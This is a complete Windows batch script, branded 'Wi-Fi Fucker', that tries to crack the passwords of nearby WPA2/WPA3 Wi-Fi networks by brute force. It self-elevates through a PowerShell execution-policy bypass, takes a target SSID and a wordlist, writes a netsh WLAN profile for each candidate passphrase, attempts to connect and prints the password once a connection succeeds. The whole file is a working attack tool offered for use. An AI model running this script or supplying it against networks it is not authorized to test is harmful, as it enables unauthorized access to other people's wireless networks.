@echo off
cd /d "%~dp0"
goto dependencies

:dependencies
color 1
title Checking dependencies...
cls

where powershell >nul 2>&1
if %errorlevel% equ 0 (
    echo.
) else (
    echo    [ERROR] Script requires Powershell to run.
)

echo    [INFO] Starting Script as an Administrator...
net session >nul 2>&1 || (
    powershell -EP Bypass -NoP -C start "%~0" -verb runas >nul
    if errorlevel 1 (
        echo.
        echo    [ERROR] Script requires Administrator privileges to run.
        echo    [INFO] Press any key to exit.
        pause >nul
        exit /b 1
    )
    exit /b
)
cls

color 4
where netsh >nul 2>&1
if errorlevel 1 (
    echo.
    echo    [ERROR] The "netsh" command is not available on this system. Please ensure compatibility.
    echo    [INFO] Press any key to exit.
    pause >nul
    exit /b
)

sc query wlansvc | find /i "RUNNING" >nul 2>&1
if errorlevel 1 (
    echo.
    echo    [ERROR] The "WLAN AutoConfig" service is not running, Wi-Fi is disabled, or an Ethernet connection is being used.
    echo    [INFO] Press any key to exit.
    pause >nul
    goto dependencies
)

goto menu

:help
title Help - Everything you need to know
color e
cls
echo    ====================================
echo                   HELP
echo    ====================================
echo.
echo    Dependencies: Powershell, at least Windows 10, english system
echo.
echo    [INFO] Press any key to return to the menu.
pause >nul
goto menu

:menu
cls
title Wi-Fi Fucker - Fuck'em all!
color 5

goto show_interface

:show_interface
cls
set "bannerpath=%~dp0content\banner.txt"
if not exist "%~dp0content\" mkdir "%~dp0content"
if exist "%bannerpath%" (
    type "%bannerpath%"
) else (
    echo    [ERROR] Banner file not found. Skipping.
)
echo    ===================================
echo       Available Network Interfaces:
echo       Scan Time: %date% %time:~0,8%
echo       -h for help or -r to refresh
echo    ===================================
echo.

netsh wlan show interfaces | findstr /R /C:"^ *Name" /C:"^ *Description" /C:"^ *Physical address" /C:"^ *Interface Type" /C:"^ *Signal" /C:"^ *Band"
if errorlevel 1 (
    echo.
    echo    [ERROR] No Wi-Fi adapter detected or an Ethernet connection is being used.
    echo    [INFO] Press any key to exit.
    pause >nul
    exit /b
)

echo.
set /p interface="Enter interface name: "
if /i "%interface%"=="-r" goto show_interface
if not defined interface (
    echo    [Invalid input] Interface name cannot be empty.
    pause >nul
    goto show_interface
)

goto show_networks

:show_networks
cls
if exist "%bannerpath%" (
    type "%bannerpath%"
) else (
    echo    [ERROR] Banner file not found. Skipping.
)
echo    ==================================================
echo             Available Wi-Fi Networks Nearby:
echo              Scan Time: %date% %time:~0,8%
echo       -h for help or -r to refresh or -b to return
echo    ==================================================
netsh wlan show networks interface="%interface%"
if %errorlevel% neq 0 (
    echo    [ERROR] This Problem may be caused because no Wi-Fi adapter was detected or you are using an Ethernet connection.
    echo    Press any key to return to the menu.
    pause >nul
    goto start
)

goto enter_SSID

:enter_SSID
set /p SSID="Enter the SSID of the Network: "
if not defined SSID (
    echo    [Invalid input] SSID cannot be empty.
    goto enter_SSID
)
goto enter_WPA

:enter_WPA
set /p WPA="Enter the WPA version (WPA2 or WPA3 only): "
if /i "%WPA%"=="WPA2" (
    set "WPA=WPA2PSK"
) else if /i "%WPA%"=="WPA3" (
    set "WPA=WPA3SAE"
) else (
    echo.
    echo    [Invalid input] WPA version "%WPA%" is not supported. Use "WPA2" or "WPA3".
    goto enter_WPA
)

:enter_wordlist
set /p WordlistPath="Enter the path to the wordlist (see help for conditions): "
if not defined WordlistPath (
    set "WordlistPath=%~dp0wordlist\word.txt"
)

if not exist "%WordlistPath%" (
    echo.
    echo    [ERROR] Wordlist file not found at "%WordlistPath%".
    goto enter_wordlist
)

goto check

:check
cls
if exist "%bannerpath%" (
    type "%bannerpath%"
) else (
    echo.
    echo    [ERROR] Banner file not found. Skipping.
)

for /f %%D in ('powershell -Command "[BitConverter]::ToString([Text.Encoding]::UTF8.GetBytes('%SSID%')).Replace('-', '')"') do (
    set "hex=%%D"
)

set "encryption=AES"
set "conType=ESS"

echo    =======================================================
echo                      Gathered Information:
echo    =======================================================
echo       Interface:        %interface%
echo       SSID:             %SSID%
echo       Wordlist Path:    %WordlistPath%
echo       WPA Version:      %WPA%
echo       HEX:              %hex%
echo       Encryption:       %encryption%
echo       Connection Type:  %conType%
echo    =======================================================
echo.
echo.

set /p checkTable="Do you want to edit these values (Y/N): "
if /i "%checkTable%"=="Y" goto edit
if /i "%checkTable%"=="N" goto initalizing
echo.
echo    [Invalid input] Please enter "Y" to continue or "N" to edit.
echo    [INFO] Press any key to try again.
pause >nul
goto check


:edit
cls
if exist "%bannerpath%" (
    type "%bannerpath%"
) else (
    echo.
    echo    [ERROR] Banner file not found. Skipping.
    echo.
)
echo    WARNING: Editing these values is highly discouraged!
echo.
echo    Type in the new Values. Press enter to skip a Value.
echo.

set /p new_interface="Enter Interface to use (current: %interface%): "
if not "%new_interface%"=="" set "interface=%new_interface%"
set /p new_SSID="Enter SSID to attack (current: %SSID%): "
if not "%new_SSID%"=="" set "SSID=%new_SSID%"
set /p new_WordlistPath="Wordlist to use (current: %WordlistPath%): "
if not "%new_WordlistPath%"=="" set "WordlistPath=%new_WordlistPath%"
set /p new_WPA="WPA version to use (current: %WPA%): "
if not "%new_WPA%"=="" set "WPA=%new_WPA%"
set /p new_hex="hex(current: %hex%): "
if not "%new_hex%"=="" set "hex=%new_hex%"
set /p new_encryption="Encryption Type of Target (current: %encryption%): "
if not "%new_encryption%"=="" set "encryption=%new_encryption%"
set /p new_conType="Connection Type to use (current: %conType%): "
if not "%new_conType%"=="" set "conType=%new_conType%"
goto check

:initalizing
netsh wlan disconnect >nul
set "batch=0"
set "SSID_with_space="
set "SSID_escaped="

sc query wlansvc | find /i "RUNNING" >nul 2>&1
if errorlevel 1 (
    echo.
    echo    [ERROR] The "WLAN AutoConfig" service is not running or Wi-Fi is disabled or you are using an Ethernet connection.
    echo    [INFO] Press any key to exit.
    pause >nul
    exit /b
)

echo.
echo    [INFO] Checking for old profiles...
del /q "profiles" >nul 2>&1
if not exist "profiles" mkdir "profiles"

if not exist "%WordlistPath%" (
    echo    [ERROR] The wordlist file does not exist or the path is invalid.
    echo    [INFO] Press any key to continue.
    pause >nul
    goto show_networks
)

echo.
echo    [INFO] Processing the wordlist (bigger files need longer)...

for /f "delims=" %%A in ('type "%WordlistPath%"') do set "check_line=%%A"
if "%check_line%"=="" (
    echo    [ERROR] The wordlist is empty or invalid.
    echo    [INFO] Press any key to continue.
    pause >nul
    goto show_networks
)
goto create_xml

:create_xml
cls
if exist "%bannerpath%" (
    type "%bannerpath%"
) else (
    echo.
    echo    [ERROR] Banner file not found. Skipping.
    echo.
)
echo    --- Trying to get the Password for %SSID% ---
echo.

set "file_count=0"

for /f "tokens=*" %%A in ('type "%WordlistPath%"') do (
    call :processline "%%A"
)

goto :eof

:processline
set "line=%~1"
if not defined line (
    echo    [ERROR] Empty key. Skipping.
    goto :eof
)

set "lineLength=0"
for /l %%i in (1,1,63) do if not "!line:~%%i,1!"=="" set /a lineLength+=1

if %lineLength% lss 8 (
    echo    [ERROR] Key must be at least 8 characters. Skipping.
    goto :eof
)

if %lineLength% gtr 63 (
    echo    [ERROR] Key must be at most 63 characters. Skipping.
    goto :eof
)
set /a batch=batch+1

echo.
echo    [Attack] Attempt number %batch% with Password %line%

set "line=%line:&=&amp;%"
set "line=%line:<=&lt;%"
set "line=%line:>=&gt;%"
set "line=%line:"=&quot;%"

set "SSID_escaped=%SSID%"
set "SSID_escaped=%SSID_escaped:&=&amp;%"
set "SSID_escaped=%SSID_escaped:<=&lt;%"
set "SSID_escaped=%SSID_escaped:>=&gt;%"
set "SSID_escaped=%SSID_escaped:"=&quot;%"


(
    echo ^<?xml version="1.0"?^>
    echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>
    echo     ^<name^>%SSID%^</name^>
    echo     ^<SSIDConfig^>
    echo         ^<SSID^>
    echo             ^<hex^>%hex%^</hex^>
    echo             ^<name^>%SSID%^</name^>
    echo         ^</SSID^>
    echo     ^</SSIDConfig^>
    echo     ^<connectionType^>%conType%^</connectionType^>
    echo     ^<connectionMode^>auto^</connectionMode^>
    echo     ^<MSM^>
    echo         ^<security^>
    echo             ^<authEncryption^>
    echo                 ^<authentication^>%WPA%^</authentication^>
    echo                 ^<encryption^>%encryption%^</encryption^>
    echo                 ^<useOneX^>false^</useOneX^>
    echo             ^</authEncryption^>
    echo             ^<sharedKey^>
    echo                 ^<keyType^>passPhrase^</keyType^>
    echo                 ^<protected^>false^</protected^>
    echo                 ^<keyMaterial^>%line%^</keyMaterial^>
    echo             ^</sharedKey^>
    echo         ^</security^>
    echo     ^</MSM^>
    echo     ^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^>
    echo         ^<enableRandomization^>false^</enableRandomization^>
    echo     ^</MacRandomization^>
    echo ^</WLANProfile^>
) > profiles\%batch%.xml

netsh wlan add profile filename="profiles\%batch%.xml" user=current interface="%interface%" >nul

setlocal

netsh wlan connect name="%SSID%" >nul
goto check_connection

:check_connection
set "ConnectionState="
set /a AssociatingCount=1

:check_loop
for /f "tokens=2 delims=:" %%A in ('netsh wlan show interfaces 2^>^&1 ^| findstr /i "State"') do (
    set "ConnectionState=%%A"
)
if not defined ConnectionState (
    echo [ERROR] Unable to detect connection state. Retrying...
    timeout /t 1 >nul
    goto check_loop
)

set "ConnectionState=%ConnectionState:~1%"

if /i "%ConnectionState%"=="connected" (
    echo.
    echo    --- Password: %line% ---
    echo.
    goto return
) else if /i "%ConnectionState%"=="disconnected" (
    goto delete
) else if /i "%ConnectionState%"=="disconnecting" (
    timeout /t 1 >nul
    goto check_loop
) else if /i "%ConnectionState%"=="associating" (
    set /a AssociatingCount+=1
    if %AssociatingCount% gtr 2 (
        goto delete
    )
    timeout /t 1 >nul
    goto check_loop
) else if /i "%ConnectionState%"=="authenticating" (
    timeout /t 1 >nul
    goto check_loop
) else if /i "%ConnectionState%"=="searching" (
    timeout /t 1 >nul
    goto check_loop
) else (
    echo [ERROR] Unknown status detected: %ConnectionState%. Retrying...
    timeout /t 1 >nul
    goto check_loop
)

:return
set /p option="Do you want to leave Wi-Fi Fucker (l) or return to the main menu (m): "
if /i "%option%"=="l" exit
if /i "%option%"=="m" goto menu
echo.
echo    [Invalid input] Please enter "l" to leave or "m" to return to the menu.
echo    [INFO] Press any key to try again.
pause >nul
goto return

:delete
setlocal
powershell -Command "Remove-Item -Path 'profiles\%batch%.xml' -Force"
endlocal